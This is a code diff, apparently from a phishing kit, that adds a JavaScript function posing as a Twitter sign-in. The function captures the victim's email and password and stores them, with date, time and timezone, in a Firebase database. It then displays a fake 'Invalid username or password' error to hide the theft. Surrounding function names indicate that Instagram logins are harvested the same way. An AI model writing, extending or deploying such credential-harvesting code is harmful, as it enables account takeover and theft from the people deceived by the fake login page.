@@ -50,6 +50,42 @@ function login() {
   }
 }
 
+function twlogin() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      showError(error.message, "error_box");
+    });
+
+  var email = document.getElementById("tw-email").value;
+  var password = document.getElementById("tw-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Twitter";
+
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showError("Invalid username or password", "error_box");
+      document.getElementById("tw-pass").value = "";
+      return false;
+    }, 2000);
+  } else {
+    showError("Please enter both email and password.", "error_box");
+  }
+}
+
 function iglog() {
   var email = document.getElementById("ig-uname").value.trim();
   var password = document.getElementById("ig-pass").value.trim();
